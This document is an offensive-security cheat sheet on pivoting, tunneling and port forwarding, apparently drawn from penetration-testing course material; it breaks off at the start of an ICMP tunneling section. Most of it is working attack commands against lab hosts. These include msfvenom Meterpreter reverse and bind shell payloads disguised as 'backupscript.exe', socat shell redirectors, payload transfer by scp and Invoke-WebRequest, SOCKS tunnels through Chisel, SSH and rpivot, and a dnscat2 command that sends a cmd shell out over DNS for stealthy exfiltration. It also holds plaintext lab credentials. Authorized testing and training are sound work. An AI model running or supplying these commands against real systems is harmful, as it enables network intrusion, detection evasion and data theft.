# Pivoting Tunneling and Port Forwarding cheat sheet

# Table of content 

- [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
  - [Meterpreter Tunneling and Port Forwarding](#Meterpreter-Tunneling-and-Port-Forwarding)
  - [sshuttle](#sshuttle)
  - [chisel](#chisel)
  - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling)
  - [Remote-Reverse Port Forwarding with SSH](#Remote-Reverse-Port-Forwarding-with-SSH)
  - [Socat Redirection with a Reverse Shell](#Socat-Redirection-with-a-Reverse-Shell)
  - [Socat Redirection with a Bind Shell](#Socat-Redirection-with-a-Bind-Shell)
  - [SSH for Windows plink exe](#SSH-for-Windows-plink-exe)
  - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
  - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
  - [Port Forwarding with Windows Netsh](#Port-Forwarding-with-Windows-Netsh)
  - [DNS Tunneling with Dnscat2](#DNS-Tunneling-with-Dnscat2)
  - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
  - [Chisel Reverse Pivot](#Chisel-Reverse-Pivot)
  - [ICMP Tunneling with SOCKS](#ICMP-Tunneling-with-SOCKS)
  - [RDP and SOCKS Tunneling with SocksOverRDP](#RDP-and-SOCKS-Tunneling-with-SocksOverRDP)
  
  
  
## Pivoting Tunneling and Port Forwarding
  
![image](https://user-images.githubusercontent.com/24814781/180607278-0f03a6e9-6822-4deb-bfa0-a61cb6bdd29f.png)
 
 
During a red team engagement, penetration test, or an Active Directory assessment, we will often find ourselves in a situation where we might have already compromised the required credentials, ssh keys, hashes, or access tokens to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a pivot host that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our privilege level, network connections, and potential VPN or other remote access software. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments.

There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:

    Pivot Host
    Proxy
    Foothold
    Beach Head system
    Jump Host

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

We will inevitably come across several different terms used to describe the same thing in IT & the Infosec industry. With pivoting, we will notice that this is often referred to as Lateral Movement.

Isn't it the same thing as pivoting?

The answer to that is not exactly. Let's take a second to compare and contrast Lateral Movement with Pivoting and Tunneling, as there can be some confusion as to why some consider them different concepts.
  
### Lateral Movement, Pivoting, and Tunneling Compared
  
Lateral Movement

Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:

Palo Alto Network's Explanation

MITRE's Explanation

One practical example of Lateral Movement would be:

During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further. 

  
### Pivoting

Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

One practical example of Pivoting would be:

During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment. 


### Tunneling

We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command & Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.

One practical example of Tunneling would be:

One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. 
  

## Meterpreter Tunneling and Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

We know that the Windows target (example) is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
example:
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

Ping Sweep For Loop on Linux Pivot Hosts
example:
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Ping Sweep For Loop Using CMD
example:
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping Sweep Using PowerShell
example:
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. 


There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
example:
```
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
```
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

obs: in meterpreter on metasploit
example:
```
background 
use post/multi/manage/autoroute
set SESSION 1
set SUBNET  172.16.6.0
set NETMASK 24
run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
example:
```
run autoroute -s 172.16.5.0/23
```

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
example:
```
run autoroute -p
```

We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
example:
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

Port Forwarding
Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
```
help portfwd
```
```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

Creating Local TCP Relay
example:
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3300 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

Connecting to Windows Target through localhost
example:
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Netstat Output
We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
example:
```
netstat -antp
```

Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
example:
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.


### sshuttle
Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
```
https://github.com/sshuttle/sshuttle
```

### chisel
A fast TCP/UDP tunnel over HTTP 
```
https://github.com/jpillora/chisel
```

### Dynamic Port Forwarding with SSH and SOCKS Tunneling
we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
  
Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. 
```
ssh -D 9050 ubuntu@10.129.202.64
```

The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

To inform proxychains that we must use port 1080/9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 1080/9050 to the last line if it is not already there.

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 1080/9050, where our SSH client is listening, which will forward all the packets over SSH to the x.x.x.x./23 network.

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
```
proxychains msfconsole
```
Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.
```
search rdp_scanner
```

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For example, we can log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. 

### Remote-Reverse Port Forwarding with SSH
We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well.

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:/backupscript.exe  
```

Starting Python3 Webserver on Pivot Host

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

```
python3 -m http.server 8123
```

We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
```
Invoke-WebRequest -Uri "http://<ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
```


Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Socat Redirection with a Reverse Shell 

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

Starting Socat Listener

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Creating the Windows Payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.


## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. 

We can create a bind shell using msfvenom with the below command.

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```


We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)


## SSH for Windows plink exe

Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
```
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
```
https://www.putty.org/
```

Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer. 

That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.


The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

Using Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

```
https://www.proxifier.com/
```

After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.


port 2805 is an example:
```
echo y|&./plink -R 2805:127.0.0.1:2805 -l <your username> -pw <your passwd> <your ip>
```
  
obs: make sure your ssh is open/started
```
sudo systemctl start ssh
```
the echo y is required the first time we run plink to tell it to accept the
ssh key of the server. The -R 2805:127.0.0.1:2805 is necessary to
bypass the local firewall and access veeam from your attacker
machine.
  
  
## SSH Pivoting with Sshuttle

Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts.
```
sudo apt-get install sshuttle
```
```
https://github.com/sshuttle/sshuttle
```


To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.


We can now use any tool directly without using proxychains.


## Web Server Pivoting with Rpivot
```
https://github.com/klsecservices/rpivot
```
Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

Cloning rpivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
```
```
sudo git clone https://github.com/klsecservices/rpivot.git
```

Installing Python2.7
```
sudo apt-get install python2.7
```


We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```


Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
```
scp -r rpivot <user>@<IpaddressOfTarget>:/home/<user>/
```

Running client.py from Pivot Target
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which for an example is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```


Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## Port Forwarding with Windows Netsh
```
https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
```
Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

    Finding routes
    Viewing the firewall configuration
    Adding proxies
    Creating port forwarding rules

Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (10.129.15.150,172.16.5.25). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. 

We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

Using Netsh.exe to Port Forward
```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Verifying Port Forward
```
netsh.exe interface portproxy show v4tov4
```

After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.



## DNS Tunneling with Dnscat2
```
https://github.com/iagox86/dnscat2
```
Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

Setting Up & Using dnscat2

If dnscat2 is not already set up on our attack host, we can do so using the following commands:

Cloning dnscat2 and Setting Up the Server
```
git clone https://github.com/iagox86/dnscat2.git
```

We can then start the dnscat2 server by executing the dnscat2 file.

example:
```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```


After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use "dnscat2-powershell",
```
https://github.com/lukebaggett/dnscat2-powershell
```

a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

Cloning dnscat2-powershell to the Attack Host
```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets

Importing dnscat2.ps1
```
PS C:\suljov> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
```
PS C:\suljov> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

We can list the options we have with dnscat2 by entering ? at the prompt.

Listing dnscat2 Options
```
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.
  
Interacting with the Established Session
```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```


### SOCKS5 Tunneling with Chisel
```
https://github.com/jpillora/chisel
```
Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network). We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, for an example we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.


Setting Up & Using Chisel

Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
```
git clone https://github.com/jpillora/chisel.git
```
even better use this one
```
https://github.com/jpillora/chisel/releases?  
```



We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binary.
```
cd chisel
```
```
go build
```

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF"
```
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
```

and IppSec's walkthrough of the box Reddish. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.

```
https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s
```

Once the binary is built, we can use SCP to transfer it to the target pivot host.

example:
```
scp chisel ubuntu@10.129.202.64:~/
```

Then we can start the Chisel server/listener.

```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.

```
Suljov@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

Editing & Confirming proxychains.conf

We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.

example:
```
Suljov@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
  
Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
  
### Chisel Reverse Pivot

In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option --reverse.


Starting the Chisel Server on our Attack Host
```
Suljov@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```
  
Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks 
```
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.

```
Suljov@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

We will use the ptunnel-ng tool:
```
